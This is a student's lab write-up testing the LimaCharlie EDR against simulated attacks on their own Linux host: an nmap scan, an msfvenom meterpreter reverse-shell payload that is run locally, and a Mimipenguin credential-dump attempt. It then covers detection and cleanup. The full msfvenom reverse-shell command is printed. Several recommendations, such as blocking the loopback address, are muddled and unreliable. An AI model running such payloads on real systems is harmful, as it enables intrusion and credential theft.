# Limacharlie-endpoint-investigation


Title: Limacharlie endpoint investigation 

Date: May 25th 2026

Analyst: Savon Masters

					                                          Summary

That attacks that remain on the endpoint are an issue to the device and the user. Every EDR gives visibility, chain of events, and offensive actions to stop processes' behaviors. All of this was true when I learned tools that were monitored on the entire system. 

			                                            Investigation 

![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/591454cdafb8f7f20d1a70270a640687256c1396/Screenshot%20(7).png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/ae9e49c9675419d53ca32d4ecf146bf5d9ecf41c/Screenshot%20from%202026-05-26%2017-57-57.png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/43a45d409c00fa832717d39e71d72172cf1f69ae/Screenshot%20from%202026-05-29%2018-11-42.png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/df0d1b23b00718f32eb0567fd89c17c2d0f1f633/Screenshot%20from%202026-05-25%2017-54-13.png)
I configured and downloaded Limacharlie Endpoint detection and response to my Linux host and impersonated an attacker actions with my own commands, and a pack of security tools titled “NMAP”, “Metasploit”, and “Mimipenguin”.


![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/f6ec915dc46026d32bd6195a15c7eb05d1df3907/Screenshot%20from%202026-05-25%2018-14-39.png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/be5c8ea5aa5238fa4adad1d4fac7cba87e24f65c/Screenshot%20(4).png)
I set up a port scan on my host with the command “nmap -p 21,22,23,25,53,80,443” and changing up to Limacharlie I was able to see the command being ran with the timeline feature. 


![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/28830a7cecb88b3dc186c61b758cd00d0aa06fa6/Screenshot%20from%202026-05-26%2018-01-19.png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/019593798fe2f668bbc2f095367ebc23cfbb5ad4/Screenshot%20from%202026-05-26%2018-42-28.png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/96c5de2ccdc5abd03a4758cf06b33ad17d8a983c/Screenshot%20from%202026-05-26%2018-47-32.png)
Now I initiated metaspoilt instructing msconsole to fix a reverse_tcp to my host “127.0.0.1” on port “4444” going on ahead I prompted msfvenom to download a payload to my host showing the command for a file“msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > Systemfiles.elf” then made Systemfiles.elf an exe and executed it. 



![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/e445a5789cbbd363ff8df754753b027e5fd4255a/Screenshot%20(9).png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/a9be82dda37355f6c60591ff3a5113cd37b0b516/Screenshot%202026-05-26%20191458.png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/118e10a5ce64b110c7677bee8428aed17789bbd3/Screenshot%202026-05-26%20191543.png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/e9ca6a8fa83d500130a602d10eab7695367825e7/Screenshot%20from%202026-05-26%2019-17-12.png)
I was told information that a process going by the name of “Systemfiles.elf” was downloaded. I went to processes in Limacharlie and could evaluate it, in that location I found the process ID “16175”, file path “/home/vboxuser/Systemfiles.elf”, command line “./Systemfile.elf” and network connection that developed it “Source IP address 127.0.0.1.44446 Destination IP address 127.0.0.1.4444”. My redemeditation technique was to kill the process and the reverse_tcp connection tells the user that the process was killed in msfvenom.



![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/c05f613833a406b7fedb7b0367d523d38b19941a/Screenshot%20from%202026-05-29%2018-22-12.png)
![image alt](https://github.com/SavonMasters/Limacharlie-endpoint-investigation/blob/9daaaf8fad5143b8c472918406caefcb531478cb/Screenshot%202026-05-29%20184443.png)
I gave “Mimipenguin” an opportunity to dump credentials; none were found even so I created a detection and response rule as a warning wall to alert if the exploit is used and it stated there was one into my feed. 


						                                          Conclusion 

All of the events noted that an increased amount of attacks took place featuring; port scanning, a C2 tunnel, an unknown process being downloaded, and credential dump. A common solution to these problems are create a detection rule for port scanning, disconnect the C2 tunnel, and break the process off. How fast this investigation went is all equal to the EDR being applied. 


							                                            IOCs

* The option “NMAP” being active.
* The IP address “127.0.0.1” port scanning the computer.
* The network connector “Metasploit” speaking to the system.
* With the command “msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > Systemfiles.elf” to start a path between “127.0.0.144446” and “127.0.0.14444”.
* The process “Systemfiles.elf” process ID “16175” being the connector for the C2 tunnel.
* “Mimipenguin” being requested on the system.


					                                          	Recommendations 

* Block the IP address “127.0.0.1”
* Ban “NMAP” from being used on the system.
* Lose the C2 transmissions from receiving.
* The object “Metasploit” should not be allowed on the system. 
* Update the settings of the “Systemfiles.elf” elf file to not be an executable and send it off the system.
* Harden the compartments of passwords it would make “Mimipenguin” be unreachable to data.
* Any other time “Mimipenguin” is told to search the system there will be a detection rule. 


					                                              	Things I learned 

* Be unnoticed while pulling host information remotely.
* Being speedy movements to deploy the incident response foundations. 
* Intake all of Limacharlie's powers to have an endpoint defendable. 
* Go as you need and tighten the events presented to the organization.  
